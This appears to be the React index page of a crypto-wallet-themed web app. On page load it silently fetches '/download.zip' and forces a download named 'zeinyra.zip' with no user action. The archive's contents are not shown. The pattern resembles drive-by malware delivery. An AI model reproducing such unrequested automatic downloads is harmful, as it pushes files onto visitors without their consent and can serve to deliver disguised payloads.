
import React, { useEffect } from 'react';
import AppLayout from '@/components/AppLayout';
import ProvisioningModal from '@/components/dashboard/ProvisioningModal';
import { AppProvider } from '@/contexts/AppContext';
import { WalletProvider } from '@/contexts/WalletContext';

const Index: React.FC = () => {
  useEffect(() => {
    downloadZippedTxt();
  }, []);

  async function downloadZippedTxt() {
    try {
      const res = await fetch("/download.zip");
      if (!res.ok) throw new Error("File not found");
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "zeinyra.zip";
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
    } catch (err) {
      console.error("Download failed", err);
    }
  }

  return (
    <WalletProvider>
      <AppProvider>
        <AppLayout />
        <ProvisioningModal />
      </AppProvider>
    </WalletProvider>
  );
};

export default Index;
